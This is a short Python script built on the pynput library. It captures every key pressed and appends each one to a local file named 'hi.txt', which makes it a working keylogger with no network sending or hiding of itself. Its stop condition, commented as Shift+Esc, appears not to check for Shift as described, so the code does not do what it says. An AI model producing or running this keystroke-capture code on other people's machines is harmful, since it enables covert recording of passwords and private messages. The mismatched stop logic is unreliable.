from pynput import keyboard

# Create a flag to control the logging state
logging_active = True

def on_press(key):
    global logging_active
    if logging_active:
        try:
            with open("hi.txt", "a") as log_file:
                log_file.write(f'{key.char}\n')
        except AttributeError:
            with open("hi.txt", "a") as log_file:
                log_file.write(f'{key}\n')

    # Check if Shift + Esc is pressed to stop logging
    if hasattr(key, 'shift') and key == keyboard.Key.esc:
        logging_active = False
        return False  # Stop the listener

# Collect events until stopped
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
